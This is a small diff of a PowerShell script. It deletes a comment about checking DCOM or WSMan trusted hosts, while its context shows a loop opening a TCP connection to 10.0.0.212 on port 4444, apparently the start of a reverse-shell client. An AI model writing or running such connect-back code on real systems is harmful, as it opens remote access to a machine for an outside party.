@@ -13,12 +13,9 @@ function title {
     Write-Host ""
 }
 
-#check if host is using dcom (is less secure) or wsman Get-Item WSMan:\localhost\Client\TrustedHosts
-
 function run() {
     title
     while ($true) {
-
         try {
             $server = "10.0.0.212"
             $client = New-Object System.Net.Sockets.TCPClient($server, 4444)
